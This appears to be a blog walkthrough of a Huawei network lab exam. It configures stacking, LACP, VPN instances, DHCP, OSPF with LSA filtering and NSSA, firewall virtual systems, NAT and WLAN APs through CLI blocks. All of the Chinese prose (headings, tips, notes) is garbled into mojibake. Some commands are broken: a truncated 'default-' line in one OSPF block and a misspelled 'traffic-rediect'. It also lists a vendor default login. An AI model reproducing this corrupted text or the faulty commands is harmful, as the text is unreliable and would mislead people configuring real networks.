![image-20250811083042852](http://7r1UMPHK.github.io/image/20250813214156783.webp)

&gt; [!TIP]
&gt; ‰∏ªÂ§áÂÄíÊç¢:
&gt;
&gt; slave switchover enable
&gt;
&gt; slave switchover
&gt;
&gt; ÈáçÁΩÆÂ†ÜÂè†:
&gt;
&gt; reset stack configuration

*ps:ÂΩìÈÖçÁΩÆÂ†ÜÂè†ÊúâËØØÔºåÂª∫ËÆÆÁõ¥Êé•ÈáçÁΩÆÂ†ÜÂè†*

## 1.2 ÈÖçÁΩÆÈìæË∑ØËÅöÂêà

![image-20250811083741031](http://7r1UMPHK.github.io/image/20250813214149499.webp)

*ps:ÈÖçÁΩÆÈìæË∑ØËÅöÂêàÊó∂Ê≥®ÊÑè‰ΩøÁî®dis ll n bÊü•Áúã‰∫íËÅîÊé•Âè£ÔºåÊ†πÊçÆÂÆûÈôÖÊÉÖÂÜµËÄåÂÆöÔºåÂàáÂãøÊ≠ªËÆ∞Êé•Âè£ÁºñÂè∑*

ÂÖàÂ∞ÜÁõ∏ÂÖ≥ËÆæÂ§áÊîπÂêçÔºåÂºÄÂêØlldp

### ÊâπÈáè

```
sys
sys *
ll en
```

### Core

```
[X_T1_Core1]dis lldp neighbor  brief 
Local Intf   Neighbor Dev             Neighbor Intf             Exptime
GE0/0/11     X_T2_AGG1                GE0/0/13                  93     
GE0/0/12     X_T2_AGG1                GE0/0/14                  93     
GE0/0/13     X_T1_AGG1                GE0/0/13                  95     
GE0/0/14     X_T1_AGG1                GE0/0/14                  95     
GE0/0/21     X_T2_AGG1                GE0/0/23                  93     
GE0/0/22     X_T2_AGG1                GE0/0/24                  93     
GE0/0/23     X_T1_AGG1                GE0/0/23                  95     
GE0/0/24     X_T1_AGG1                GE0/0/24                  92    
```

13Ôºå14Ôºå23Ôºå24ÊòØeth1ÁöÑÔºåÈÄöÂ∏∏Êù•ËØ¥ÊòØÈ¢ÑÈÖçÁöÑÔºåÊ£ÄÊü•

```
[X_T1_Core1]dis eth
Local:
LAG ID: 1                   WorkingMode: STATIC                               
Preempt Delay: Disabled     Hash arithmetic: According to SIP-XOR-DIP         
System Priority: 32768      System ID: 4c1f-cc7a-6702                         
Least Active-linknumber: 1  Max Active-linknumber: 8                          
Operate status: up          Number Of Up Port In Trunk: 4                     
--------------------------------------------------------------------------------
ActorPortName          Status   PortType PortPri PortNo PortKey PortState Weight
GigabitEthernet0/0/13  Selected 1GE      32768   14     305     10111100  1     
GigabitEthernet0/0/14  Selected 1GE      32768   15     305     10111100  1     
GigabitEthernet0/0/23  Selected 1GE      32768   24     305     10111100  1     
GigabitEthernet0/0/24  Selected 1GE      32768   25     305     10111100  1   
```

ÈÇ£Áõ¥Êé•ÈÖçÁΩÆeth2

```
int eth 2
mode lacp
tr g 0/0/11 0/0/12 0/0/21 0/0/22
q
```

### T2

‰πüÊòØÊâπÈáèÊâìÂºÄX_T2_AGG1„ÄÅX_T2_ACC1„ÄÅX_T2_ACC2ÁöÑlldpÂçèËÆÆ

```
sys
sys *
ll en
```

ÁÑ∂Âêé‰æùÊóßÊòØ‰ΩøÁî®lldpÊòæÁ§∫Âá∫‰∫ÜËøûÊé•‰ø°ÊÅØÈÖçÁΩÆÈìæË∑ØËÅöÂêà

#### X_T2_AGG1

```
int eth 1
mode lacp
tr g 0/0/13 0/0/14 0/0/23 0/0/24
q
int eth 2
mode lacp
tr g 0/0/11 0/0/21
int eth 3
mode lacp
tr g 0/0/12 0/0/22
q
```

#### X_T2_ACC1

```
int eth 1
mode lacp
tr g 0/0/23 0/0/24
q
```

#### X_T2_ACC2

```
int eth 1
mode lacp
tr g 0/0/23 0/0/24
q
```

![image-20250811085948464](http://7r1UMPHK.github.io/image/20250813214145946.webp)

# 2-3 Âü∫Êú¨‰∏öÂä°ÈúÄÊ±Ç‰∏éVPNÂÆû‰æãÈÖçÁΩÆ

![image-20250811090108661](http://7r1UMPHK.github.io/image/20250813214144023.webp)

![image-20250811090218906](http://7r1UMPHK.github.io/image/20250813214121814.webp)

## ÂàõÂª∫VPNÂÆû‰æã

### Core

```
ip v Employee
rou 65001:1
q
q
ip v Guest
rou 65001:2
q
q
```

## ÈÖçÁΩÆVPN‰∏éIP

### X_T1_Export2

```
vlan 202
int g6/0/1
p l a
p d v 202
int vlan202
ip add 10.1.200.5 30
int g0/0/0
ip add 10.255.3.1 24
int g0/0/1
ip add 10.255.4.1 24
int l0
ip add 10.1.0.2 32
q
```

### X_T1_Core1

*ps:ÈÖçÁΩÆvlanÁöÑÈÇ£ÈáåÔºåÂª∫ËÆÆÁõ¥Êé•ÂºÄ‰∏™txtÊñáÊú¨‰øÆÊîπÔºåÈÇ£Ê†∑Âø´‰∏ÄÁÇπ*

```
v b 60 201 to 209 51 to 55 100 to 105
# ÊàëÈ¢ÑÈÖçÊúâÈóÆÈ¢òÔºå‰ªñX_T1_Core1ÊòØaÂè£ÔºåX_T1_Export1ÊòØtÂè£ÔºåÊàëÁªü‰∏Ä‰∏Ä‰∏ãÔºå‰∏çÁÑ∂Á≠â‰ºöOSPFÈÇªÂ±Ö‰ºöÂç°Init
int g0/0/1
undo port default vlan
undo port link-type
p l t
p t a v 201
int g0/0/2
p l a
p d v 202
int g0/0/3
p t a v 51 to 55 100 to 105 203
int g0/0/4
p l t 
p t a v 204 205
un p t a v 1
int g0/0/5
p l t
p t a v 206 207
un p t a v 1
int g0/0/6
p l a
p d v 60
int vlan60
ip bin vpn-ins Employee
ip add 10.1.60.254 24
int eth2
p l t
p t a v 100 209
q
dhcp en

int vlan202
ip add 10.1.200.6 30
int vlan204
ip add 10.1.200.13 30
int vlan205
ip add 10.1.200.17 30
int vlan206
ip bin vpn-ins Employee
ip add 10.1.200.21 30
int vlan207
ip bin vpn-ins Guest
ip add 10.1.200.25 30
int vlan208
ip bin vpn-ins Employee
ip add 10.1.200.29 30
dhcp select global
int vlan209
ip bin vpn-ins Employee
ip add 10.1.200.33 30
dhcp select global

int l1
ip bin vpn-ins Employee
ip add 10.1.0.4 32
int l2
ip bin vpn-ins Guest
ip add 10.1.0.5 32

int vlan51
ip bin vpn-ins Employee
ip add 10.1.51.254 24
dhcp select global
int vlan 52
ip bin vpn-ins Employee
ip add 10.1.52.254 24
dhcp select global
int vlan53
ip bin vpn-ins Employee
ip add 10.1.53.254 24
dhcp select global
int vlan 54
ip bin vpn-ins Employee
ip add 10.1.54.254 24
dhcp select global
int vlan 55
ip bin vpn-ins Employee
ip add 10.1.55.254 24
dhcp select global

int vlan 101
ip bin vpn-ins Guest
ip add 10.1.101.254 24
dhcp select global
int vlan 102
ip bin vpn-ins Guest
ip add 10.1.102.254 24
dhcp select global
int vlan 103
ip bin vpn-ins Guest
ip add 10.1.103.254 24
dhcp select global
int vlan 104
ip bin vpn-ins Guest
ip add 10.1.104.254 24
dhcp select global
int vlan 105
ip bin vpn-ins Guest
ip add 10.1.105.254 24
dhcp select global
q
```

&gt; [!TIP]
&gt;
&gt; Ê£ÄÊü•ÂëΩ‰ª§Ôºö
&gt;
&gt; dis ip vpn-in ver Êü•ÁúãVPNÂÆû‰æãÁªëÂÆöÁöÑÊé•Âè£

### X_T1_AGG1

```
v b 11 to 15 21 to 25 100 208
int eth2
p h t v 11 to 15 21 to 25 100
int eth3
p h t v 11 to 15 21 to 25
q
```

### X_T2_AGG1

```
v b 100 209 31 to 35 41 to 45
int eth 1
p l t
p t a v 100 209
int eth 2
p h t v 31 to 35 41 to 45
int eth 3
p h t v 100 31 to 35 41 to 45
int vlan 209
ip add 10.1.200.34 30
int l0
ip add 10.1.0.7 32
q
```

### X_T1_ACC1

```
vlan 100
q
int g0/0/22
p l a
p d v 100
int eth 1
p l t
p t a v 100
q
```

### X_T2_ACC2

```
vlan 100
int eth 1
p l t
p t a v 100
int g0/0/22
p l a
p d v 100
q
```

*ps:Â¶ÇÊûúg1-20Á©∫ÈùûhybridÔºåÂàôÈúÄË¶ÅÊîπÂõûhybrid*

### X_T1_AC1

```
v b 51 to 55 100 to 105
dhcp en
int vlan 100
ip add 10.1.100.254 255.255.255.0
dhcp select inter
int g0/0/1
p t a v 51 to 55 101 to 105 100 203
q
```

&gt; [!TIP]
&gt;
&gt; Ê£ÄÊü•ÂëΩ‰ª§Ôºö
&gt;
&gt; dis vlan sum Ê£ÄÊü•vlan
&gt;
&gt; dis port vlan Ê£ÄÊü•vlanÂàíÂàÜ
&gt;
&gt; dis ip in b      Ê£ÄÊü•ip

# 4 Ê†∏ÂøÉ‰∫§Êç¢Êú∫DHCPÂú∞ÂùÄÊ±†ÈÖçÁΩÆ

![image-20250811090218906](http://7r1UMPHK.github.io/image/20250813214121814.webp)

## Core

```
ip pool market11
vpn-in Employee
gate 10.1.11.254
net 10.1.11.0 mask 255.255.255.0
ip pool market12
vpn-in Employee
gate 10.1.12.254
net 10.1.12.0 mask 255.255.255.0
ip pool market13
vpn-in Employee
gate 10.1.13.254
net 10.1.13.0 mask 255.255.255.0
ip pool market14
vpn-in Employee
gate 10.1.14.254
net 10.1.14.0 mask 255.255.255.0
ip pool market15
vpn-in Employee
gate 10.1.15.254
net 10.1.15.0 mask 255.255.255.0

ip pool procure21
vpn-in Employee
gate 10.1.21.254
net 10.1.21.0 mask 255.255.255.0
ip pool procure22
vpn-in Employee
gate 10.1.22.254
net 10.1.22.0 mask 255.255.255.0
ip pool procure23
vpn-in Employee
gate 10.1.23.254
net 10.1.23.0 mask 255.255.255.0
ip pool procure24
vpn-in Employee
gate 10.1.24.254
net 10.1.24.0 mask 255.255.255.0
ip pool procure25
vpn-in Employee
gate 10.1.25.254
net 10.1.25.0 mask 255.255.255.0

ip pool finance31
vpn-in Employee
gate 10.1.31.254
net 10.1.31.0 mask 255.255.255.0
ip pool finance32
vpn-in Employee
gate 10.1.32.254
net 10.1.32.0 mask 255.255.255.0
ip pool finance33
vpn-in Employee
gate 10.1.33.254
net 10.1.33.0 mask 255.255.255.0
ip pool finance34
vpn-in Employee
gate 10.1.34.254
net 10.1.34.0 mask 255.255.255.0
ip pool finance35
vpn-in Employee
gate 10.1.35.254
net 10.1.35.0 mask 255.255.255.0

ip pool hr41
vpn-in Employee
gate 10.1.41.254
net 10.1.41.0 mask 255.255.255.0
ip pool hr42
vpn-in Employee
gate 10.1.42.254
net 10.1.42.0 mask 255.255.255.0
ip pool hr43
vpn-in Employee
gate 10.1.43.254
net 10.1.43.0 mask 255.255.255.0
ip pool hr44
vpn-in Employee
gate 10.1.44.254
net 10.1.44.0 mask 255.255.255.0
ip pool hr45
vpn-in Employee
gate 10.1.45.254
net 10.1.45.0 mask 255.255.255.0

ip pool employee51
vpn-in Employee
gate 10.1.51.254
net 10.1.51.0 mask 255.255.255.0
ip pool employee52
vpn-in Employee
gate 10.1.52.254
net 10.1.52.0 mask 255.255.255.0
ip pool employee53
vpn-in Employee
gate 10.1.53.254
net 10.1.53.0 mask 255.255.255.0
ip pool employee54
vpn-in Employee
gate 10.1.54.254
net 10.1.54.0 mask 255.255.255.0
ip pool employee55
vpn-in Employee
gate 10.1.55.254
net 10.1.55.0 mask 255.255.255.0

ip pool Guest101
vpn-in Guest
gate 10.1.101.254
net 10.1.101.0 mask 255.255.255.0
ip pool Guest102
vpn-in Guest
gate 10.1.102.254
net 10.1.102.0 mask 255.255.255.0
ip pool Guest103
vpn-in Guest
gate 10.1.103.254
net 10.1.103.0 mask 255.255.255.0
ip pool Guest104
vpn-in Guest
gate 10.1.104.254
net 10.1.104.0 mask 255.255.255.0
ip pool Guest105
vpn-in Guest
gate 10.1.105.254
net 10.1.105.0 mask 255.255.255.0
q
```

&gt; [!TIP]
&gt;
&gt; Ê£ÄÊü•ÂëΩ‰ª§:
&gt;
&gt; dis ip pool vpn-ins Employee
&gt;
&gt; dis ip pool vpn-ins Guest

# 5 Ê†∏ÂøÉ‰∫§Êç¢Êú∫VLANÂú∞ÂùÄÊ±†ÈÖçÁΩÆ

![image-20250811090218906](http://7r1UMPHK.github.io/image/20250813214121814.webp)

*ps:ËøôÂíåÂ†ÜÂè†enspÈÉΩÂÅö‰∏ç‰∫ÜÔºåÊöÇÊó∂‰∏çÁÆ°ÔºåÊàñËÄÖ‰Ω†ÂéªACÂÅöÊµãËØïÔºåÈÇ£‰∏™ÂèØ‰ª•*

## X_T1_AGG1

```
vlan pool market
vlan 11 to 15
vlan pool procure
vlan 21 to 25
q
```

## X_T2_AGG1

```
vlan pool finance
vlan 31 to 35
vlan pool hr
vlan 41 to 45
q
```

## X_T1_AC1

```
vlan pool employee
vlan 51 to 55
vlan pool Guest
vlan 101 to 105
q
```

&gt; [!TIP]
&gt;
&gt; Ê£ÄÊü•ÂëΩ‰ª§:
&gt;
&gt; dis vlan pool all

# 6 ‰∏âÂ±ÇËÆæÂ§áOSPFÈÖçÁΩÆ

## 6.1 Ê†∏ÂøÉ‰∏éÂá∫Âè£Ë∑ØÁî±Âô®ÁöÑOSPFÈÖçÁΩÆ

### X_T1_Export1

```
ospf 1 rou 10.1.0.1
default-route-advertise always
a 0
net 10.1.0.1 0.0.0.0
net 10.1.200.1 0.0.0.0
q
q
```

### X_T1_Export2

```
ospf 1 rou 10.1.0.2
default-
a 0
net 10.1.0.2 0.0.0.0
net 10.1.200.5 0.0.0.0
q
q
```

### X_T1_Core1

```
ospf 1 rou 10.1.0.3
a 0
net 10.1.0.3 0.0.0.0
net 10.1.200.2 0.0.0.0
net 10.1.200.6 0.0.0.0
net 10.1.200.9 0.0.0.0
q
a 1
net 10.1.200.13 0.0.0.0
q
a 2
net 10.1.200.17 0.0.0.0
q
q
ospf 2 rou 10.1.0.4 vpn-ins Employee
vpn-inst simple
silent-int vlan51
silent-int vlan52
silent-int vlan53
silent-int vlan54
silent-int vlan55
silent-int vlan60
a 1
net 10.1.0.0 0.0.255.255
q
q
ospf 3 rou 10.1.0.5 vpn-ins Guest
vpn-inst simple
silent-int vlan101
silent-int vlan102
silent-int vlan103
silent-int vlan104
silent-int vlan105
a 2
net 10.1.0.0 0.0.255.255
q
q
```

## 6.2 T1Ê±áËÅöÁöÑOSPFÈÖçÁΩÆ

### 6.2.1 DHCPÈÖçÁΩÆ

![image-20250811090218906](http://7r1UMPHK.github.io/image/20250813214121814.webp)

#### X_T1_AGG1

Âü∫Á°ÄÈÖçÁΩÆÂâçÈù¢**2 Âü∫Á°Ä‰∏öÂä°ÈúÄÊ±Ç**Â∑≤ÁªèÈÖçÁΩÆËøá‰∫Ü

*ps:ÊâìÂºÄ‰Ω†ÁöÑËÆ∞‰∫ãÊú¨Ôºåctrl+cÔºåctrl+vÔºåÂìàÂìàÂìà*

```
dhcp en
int vlan 11
ip add 10.1.11.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 12
ip add 10.1.12.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 13
ip add 10.1.13.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 14
ip add 10.1.14.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 15
ip add 10.1.15.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29

int vlan 21
ip add 10.1.21.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 22
ip add 10.1.22.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 23
ip add 10.1.23.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 24
ip add 10.1.24.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 25
ip add 10.1.25.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
q
```

##### Ê£ÄÊü•

![image-20250811170247422](http://7r1UMPHK.github.io/image/20250813214119189.webp)

![image-20250811170400091](http://7r1UMPHK.github.io/image/20250813214117533.webp)

### 6.2.2 OSPF ÈÖçÁΩÆ

#### X_T1_AGG1

```
ospf 1 rou 10.1.0.6
silent-int vlan 11
silent-int vlan 12
silent-int vlan 13
silent-int vlan 14
silent-int vlan 15
silent-int vlan 21
silent-int vlan 22
silent-int vlan 23
silent-int vlan 24
silent-int vlan 25
a 1
net 10.1.0.0 0.0.255.255
q
q
```

## 6.3 Ê±áËÅöÁöÑOSPF ÈÖçÁΩÆ

### 6.3.1 DHCPÈÖçÁΩÆ

#### X_T2_AGG1

Âü∫Á°ÄÈÖçÁΩÆÂâçÈù¢**2 Âü∫Á°Ä‰∏öÂä°ÈúÄÊ±Ç**Â∑≤ÁªèÈÖçÁΩÆËøá‰∫Ü

```
dhcp en
int vlan 31
ip add 10.1.31.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 32
ip add 10.1.32.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 33
ip add 10.1.33.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 34
ip add 10.1.34.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 35
ip add 10.1.35.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33

int vlan 41
ip add 10.1.41.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 42
ip add 10.1.42.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 43
ip add 10.1.43.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 44
ip add 10.1.44.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 45
ip add 10.1.45.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
q
```

##### Ê£ÄÊü•

![image-20250812104327092](http://7r1UMPHK.github.io/image/20250813214115137.webp)

![image-20250812104359037](http://7r1UMPHK.github.io/image/20250813214113229.webp)

### 6.3.2 OSPF ÈÖçÁΩÆ

#### X_T2_AGG1

```
ospf 1 rou 10.1.0.7
silent-int vlan 31
silent-int vlan 32
silent-int vlan 33
silent-int vlan 34
silent-int vlan 35
silent-int vlan 41
silent-int vlan 42
silent-int vlan 43
silent-int vlan 44
silent-int vlan 45
a 1
net 10.1.0.0 0.0.255.255
q
q
```

#### X_T1_AC1

*ps:ÂèØËÉΩ‰ºöÊúâ‰∫∫ÈóÆÔºå‰∏∫‰ªÄ‰πàÊàëÈÉΩÊ≤°ÊúâÈÖçÁΩÆipÂ∞±Áõ¥Êé•ÈÖçospfÔºåÊòØÂõ†‰∏∫‰ªñÊòØÈ¢ÑÈÖçÁöÑÔºå‰Ω†ÂèØ‰ª•ÁúãÁúãAC1ÁöÑipË°®*

```
ospf 1 rou 10.1.0.11
a 0
net 10.1.0.11 0.0.0.0
net 10.1.200.10 0.0.0.0
q
q
```

# 7 Èò≤ÁÅ´Â¢ôÈÖçÁΩÆ

## 7.1ËôöÊãüÁ≥ªÁªüÈÖçÁΩÆ

### X_T1_FW1

&gt; [!TIP]
&gt;
&gt; ÈªòËÆ§ÂØÜÁ†ÅÔºö
&gt;
&gt; admin:Admin@123

```
v b 204 to 207
int g1/0/1
Portsw
p l t
p t a v 204 to 205
un p t a v 1
int g1/0/2
Portsw
p l t
p t a v 206 to 207
un p t a v 1
q
```

### Ê£ÄÊü•

![image-20250812111534076](http://7r1UMPHK.github.io/image/20250813214111296.webp)

```
int l1
int l2
q
vsys en
vsys name Employee
assign int l1
assign vlan 204
assign vlan 206
int vlan 204
ip add 10.1.200.14 255.255.255.252
int vlan 206
ip add 10.1.200.22 255.255.255.252
int l1
ip add 10.1.0.8 255.255.255.255
q
```

### Ê£ÄÊü•

![image-20250812154330726](http://7r1UMPHK.github.io/image/20250813214109918.webp)

```
switch vsys Employee
sy
firewall zone trust
add int vlan 206
firewall zone untrust
add int vlan 204
security-po
rule name ospf
source-z trust untrust local
destination-zone trust untrust local
service ospf
action permit
q
q
quit
quit
vsys en
vsys na Guest
assign int l2
assign vlan 205
assign vlan 207
int vlan 205
ip add 10.1.200.18 255.255.255.252
int vlan 207
ip add 10.1.200.26 255.255.255.252
int l2
ip add 10.1.0.9 255.255.255.255
q

switch vsys Guest
sy
firewall zone trust
add int vlan 207
firewall zone untrust
add int vlan 205
security-po
rule name ospf
source-z trust untrust local
destination-zone trust untrust local
service ospf
action permit
q
q
quit
quit
```

## 7.2 OSPF ÁöÑÈÖçÁΩÆ

### X_T1_FW1

```
ospf 1 rou 10.1.0.8 vpn-ins Employee
vpn-instance-cap simple
a 1
net 10.1.0.8 0.0.0.0
net 10.1.200.14 0.0.0.0
net 10.1.200.22 0.0.0.0
q
q

ospf 2 rou 10.1.0.9 vpn-ins Guest
vpn-instance-cap simple
a 2
net 10.1.0.9 0.0.0.0
net 10.1.200.18 0.0.0.0
net 10.1.200.26 0.0.0.0
q
q
```

### È™åËØÅ

ÂéªcoreÊü•Áúãospf peer

![image-20250812165616221](http://7r1UMPHK.github.io/image/20250813214106871.webp)

‰∏ÄÂÖ±9‰∏™ÔºåÂÖ®ÈÉ®full

# 8 Ê†∏ÂøÉ‰∫§Êç¢Êú∫ËøáÊª§ÊåáÂÆö3Á±ªLSA AND ÈÖçÁΩÆ NSSA Âå∫Âüü

*ps:ËøòÊòØÂª∫ËÆÆËÆ∞‰∫ãÊú¨Â§çÂà∂Â§ßÊ≥ï*

## X_T1_Core1

```
ip ip-prefix Employee deny 10.1.11.0 24
ip ip-prefix Employee deny 10.1.12.0 24
ip ip-prefix Employee deny 10.1.13.0 24
ip ip-prefix Employee deny 10.1.14.0 24
ip ip-prefix Employee deny 10.1.15.0 24

ip ip-prefix Employee deny 10.1.21.0 24
ip ip-prefix Employee deny 10.1.22.0 24
ip ip-prefix Employee deny 10.1.23.0 24
ip ip-prefix Employee deny 10.1.24.0 24
ip ip-prefix Employee deny 10.1.25.0 24

ip ip-prefix Employee deny 10.1.31.0 24
ip ip-prefix Employee deny 10.1.32.0 24
ip ip-prefix Employee deny 10.1.33.0 24
ip ip-prefix Employee deny 10.1.34.0 24
ip ip-prefix Employee deny 10.1.35.0 24

ip ip-prefix Employee deny 10.1.41.0 24
ip ip-prefix Employee deny 10.1.42.0 24
ip ip-prefix Employee deny 10.1.43.0 24
ip ip-prefix Employee deny 10.1.44.0 24
ip ip-prefix Employee deny 10.1.45.0 24

ip ip-prefix Employee deny 10.1.51.0 24
ip ip-prefix Employee deny 10.1.52.0 24
ip ip-prefix Employee deny 10.1.53.0 24
ip ip-prefix Employee deny 10.1.54.0 24
ip ip-prefix Employee deny 10.1.55.0 24

ip ip-prefix Employee permit 0.0.0.0 0 less-equal 32

ip ip-prefix Guest deny 10.1.101.0 24
ip ip-prefix Guest deny 10.1.102.0 24
ip ip-prefix Guest deny 10.1.103.0 24
ip ip-prefix Guest deny 10.1.104.0 24
ip ip-prefix Guest deny 10.1.105.0 24

ip ip-prefix Guest permit 0.0.0.0 0 less-equal 32

ospf 1
a 1
filter ip-prefix Guest imp
q
a 2
filter ip-prefix Employee imp
nssa
q
q
ospf 3
a 2
nssa
q
q
```

## X_T1_FW1

```
ospf 2
a 2
nssa
q
q
```

## Ê£ÄÊü•

![image-20250812161934561](http://7r1UMPHK.github.io/image/20250813214104057.webp)

![image-20250812170719317](http://7r1UMPHK.github.io/image/20250813214102133.webp)

# 9 Âá∫Âè£ÁΩëÁªúÈÖçÁΩÆ

## X_T1_Export1

```
----ËøôÈáåÁöÑÊòØÈ¢ÑÈÖçÁöÑÔºåÂè™ÊòØÊàëËøôÊãìÊâëÊ≤°Êúâ----
ip rou 0.0.0.0 0.0.0.0 10.255.1.254
ip rou 0.0.0.0 0.0.0.0 10.255.2.254
acl 2000
rule 5 permit
quit
int g0/0/0
nat out 2000
int g0/0/1
nat out 2000
q
-----------------------------------
acl 2000
undo rule 5
rule permit sou 10.1.11.0 0.0.0.255
rule permit sou 10.1.12.0 0.0.0.255
rule permit sou 10.1.13.0 0.0.0.255
rule permit sou 10.1.14.0 0.0.0.255
rule permit sou 10.1.15.0 0.0.0.255

rule permit sou 10.1.21.0 0.0.0.255
rule permit sou 10.1.22.0 0.0.0.255
rule permit sou 10.1.23.0 0.0.0.255
rule permit sou 10.1.24.0 0.0.0.255
rule permit sou 10.1.25.0 0.0.0.255

rule permit sou 10.1.51.0 0.0.0.255
rule permit sou 10.1.52.0 0.0.0.255
rule permit sou 10.1.53.0 0.0.0.255
rule permit sou 10.1.54.0 0.0.0.255
rule permit sou 10.1.55.0 0.0.0.255

rule permit sou 10.1.101.0 0.0.0.255
rule permit sou 10.1.102.0 0.0.0.255
rule permit sou 10.1.103.0 0.0.0.255
rule permit sou 10.1.104.0 0.0.0.255
rule permit sou 10.1.105.0 0.0.0.255
q
```

## Ê£ÄÊü•

![image-20250813093949534](http://7r1UMPHK.github.io/image/20250813214100032.webp)

## X_T1_Export2

```
ip rou 0.0.0.0 0.0.0.0 10.255.3.254
ip rou 0.0.0.0 0.0.0.0 10.255.4.254
nat address-group 1 10.255.4.2 10.255.4.100
acl 2000
rule permit sou 10.1.11.0 0.0.0.255
rule permit sou 10.1.12.0 0.0.0.255
rule permit sou 10.1.13.0 0.0.0.255
rule permit sou 10.1.14.0 0.0.0.255
rule permit sou 10.1.15.0 0.0.0.255

rule permit sou 10.1.21.0 0.0.0.255
rule permit sou 10.1.22.0 0.0.0.255
rule permit sou 10.1.23.0 0.0.0.255
rule permit sou 10.1.24.0 0.0.0.255
rule permit sou 10.1.25.0 0.0.0.255

rule permit sou 10.1.51.0 0.0.0.255
rule permit sou 10.1.52.0 0.0.0.255
rule permit sou 10.1.53.0 0.0.0.255
rule permit sou 10.1.54.0 0.0.0.255
rule permit sou 10.1.55.0 0.0.0.255

rule permit sou 10.1.101.0 0.0.0.255
rule permit sou 10.1.102.0 0.0.0.255
rule permit sou 10.1.103.0 0.0.0.255
rule permit sou 10.1.104.0 0.0.0.255
rule permit sou 10.1.105.0 0.0.0.255
q

int g0/0/0
nat out 2000
int g0/0/1
nat server protocol tcp global current-int 8081 ins 10.1.60.101 80
nat out 2000 address-group 1
q
```

## ÂÆûÁé∞ÂõûÁ®ãÊµÅÈáèËΩ¨Âèë

### Core

```
acl 3001
rule permit ip sou 10.1.60.101 0
int vlan 204
----------ËøôÊù°Ê®°ÊãüÂô®ÂÅö‰∏ç‰∫ÜÔºå‰Ω†ÂèØ‰ª•ÂÜô‰∏™ÊèèËø∞ËÆ∞ÂøÜ‰∏Ä‰∏ã----------
traffic-rediect inbound acl 3001 ip-nexthop 10.1.200.5
-----------------------------------------------------
q
```

### X_T1_Export2

```
acl 3001
rule permit ip sou 10.1.60.101 0
traffic classifier web
if-match acl 3001
traffic behavior web
redirect ip-nexthop 10.255.4.254
traffic policy web
classifier web behavior web
int vlan 202
traffic-policy web inbound
q
```

# 10 WLANÊâ©Â±ïÈúÄÊ±Ç

*ps:ËÄÉËØïÁöÑÊó∂ÂÄôÔºåÊØè‰∏™‰∫∫ÁöÑACÈ¢ÑÈÖçÊ®°ÊùøÂêçÂ≠óÊòØ‰∏ç‰∏ÄÊ†∑ÁöÑ„ÄÇ*

ËøôÊòØÊàëÁöÑÈ¢ÑÈÖçÊ®°ÊùøÔºåÂè™ÊòØÊèê‰æõÂèÇÁÖß„ÄÇ

```
wlan
 traffic-profile name default
 security-profile name default
 security-profile name X_Guest
  security wpa-wpa2 psk pass-phrase %^%#81*JKo7&lt;}DcIVzR3Lz/4(:!R=HMpVT3P^*XG[dCB
%^%# aes
 security-profile name X_Employee
  security wpa-wpa2 psk pass-phrase %^%#i#Ou6&amp;},h,-1.CNu{`N:K''qIaQs&gt;%G$+(WxjCy'
%^%# aes
 security-profile name default-wds
 security-profile name X_GEmployee
 security-profile name default-mesh
 ssid-profile name default
 ssid-profile name X_Guest
  ssid X_Guest
 ssid-profile name X_Employee
  ssid X_Employee
 vap-profile name default
 vap-profile name X_Guest
  service-vlan vlan-id 32
  ssid-profile X_Guest
  security-profile X_Guest
 vap-profile name X_Employee
  service-vlan vlan-id 31
  ssid-profile X_Employee
  security-profile X_Employee
 wds-profile name default
 mesh-handover-profile name default
 mesh-profile name default
 regulatory-domain-profile name default
 air-scan-profile name default
 rrm-profile name default
 radio-2g-profile name default
 radio-5g-profile name default
 wids-spoof-profile name default
 wids-profile name default
 wireless-access-specification
 ap-system-profile name default
 port-link-profile name default
 wired-port-profile name default
 serial-profile name preset-enjoyor-toeap 
 ap-group name default
 ap-group name ap-group1
  radio 0
   vap-profile X_Employee wlan 1
  radio 1
   vap-profile X_Guest wlan 2
 ap-id 0 type-id 69 ap-mac 00e0-fc14-40d0 ap-sn 2102354483104B292D16
  ap-name X_T1_AP1
  ap-group ap-group1
 provision-ap
#
return
```

## 10.1 Êñ∞Â¢û X_T2_AP1

&gt; [!TIP]
&gt;
&gt; ap macÂèØ‰ª•ÈÄöËøá dis arpÊü•ÁúãÔºålldp‰πüÂèØ‰ª•Áúã

```
un capwap source ip-address
capwap source interface Vlanif 100
wlan
-----ËøôÈáåÁöÑËÄÉËØïÊúâÔºå‰ΩÜÊòØÊàëÈ¢ÑÈÖçÊ≤°ÊúâÔºåÊâÄ‰ª•ÊàëËá™Â∑±ÈÖç-----
ap-group name X
vap-profile X_Employee wlan 1 radio all
vap-profile X_Guest wlan 2 radio all
q
vap-profile name X_Employee
service-vlan vlan-pool Employee
y
forward-mode tunnel
y
q
vap-profile name X_Guest
service-vlan vlan-pool Guest
y
forward-mode tunnel
y
q
-------------------------------------------
ap-id 0
ap-group X
y
q
ap-id 1 ap-mac 00e0-fc66-08b0
ap-name X_T2_AP1
ap-group X
y
q
```

